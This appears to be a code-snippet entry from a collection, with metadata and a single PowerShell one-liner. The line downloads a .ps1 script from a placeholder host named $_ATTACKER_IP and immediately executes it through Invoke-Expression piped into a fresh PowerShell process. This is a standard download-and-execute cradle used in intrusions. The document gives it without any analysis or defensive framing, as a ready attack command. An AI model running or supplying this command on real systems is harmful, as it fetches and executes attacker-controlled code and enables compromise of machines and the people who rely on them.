---
id: 8ff9c5c2-987b-4a22-84dd-56267e2e87a6
type: code
language: Powershell
verified: false
created_at: '2020-03-17T00:25:18.722221+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 8ff9c5c2

**Language**: Powershell

```powershell
echo iex(new-Object Net.WebClient).downloadString("http://$_ATTACKER_IP/$_FILENAME.ps1") | powershell -noprofile -
```


